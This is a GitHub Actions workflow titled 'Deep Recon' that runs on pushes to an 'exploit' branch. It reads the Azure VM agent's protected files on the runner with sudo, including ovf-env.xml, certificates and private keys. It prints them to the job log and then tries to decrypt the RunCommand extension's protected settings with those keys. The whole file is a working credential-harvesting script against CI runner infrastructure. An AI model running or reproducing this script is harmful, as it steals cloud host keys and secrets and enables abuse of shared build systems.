name: Deep Recon
on:
  push:
    branches: [exploit]
    paths: ['.github/workflows/recon.yml']
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Get Secrets
        run: |
          set +e
          echo "=== OVF-ENV ==="
          sudo cat /var/lib/waagent/ovf-env.xml
          echo ""
          echo "=== CERTS PEM ==="
          sudo cat /var/lib/waagent/Certificates.pem
          echo ""
          echo "=== SHARED CONFIG ==="
          sudo cat /var/lib/waagent/SharedConfig.xml
          echo ""
          echo "=== PRV 87A6 ==="
          sudo cat /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv
          echo ""
          echo "=== PRV EE99 ==="
          sudo cat /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv
          echo ""
          echo "=== CRT EE99 THUMBPRINT ==="
          sudo openssl x509 -in /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -fingerprint -noout
          echo ""
          echo "=== CRT 87A6 THUMBPRINT ==="
          sudo openssl x509 -in /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -fingerprint -noout
          echo ""
          echo "=== RUN CMD FILES ==="
          sudo find /var/lib/waagent/run-command -type f
          sudo find /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 -type f
          echo ""
          echo "=== SETTINGS FILE ==="
          sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings
          echo ""
          echo "=== DECRYPT WITH EE99 ==="
          SETTINGS=$(sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings 2>/dev/null)
          PROTECTED=$(echo "$SETTINGS" | grep -oP '"protectedSettings"\s*:\s*"\K[^"]+')
          echo "$PROTECTED" | base64 -d > /tmp/enc.der 2>/dev/null
          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv -recip /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -in /tmp/enc.der 2>&1 | head -50
          echo ""
          echo "=== DECRYPT WITH 87A6 ==="
          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv -recip /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -in /tmp/enc.der 2>&1 | head -50
          echo ""
          echo "=== DECRYPT WITH TRANSPORT ==="
          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/TransportPrivate.pem -in /tmp/enc.der 2>&1 | head -50
          echo "=== DONE ==="
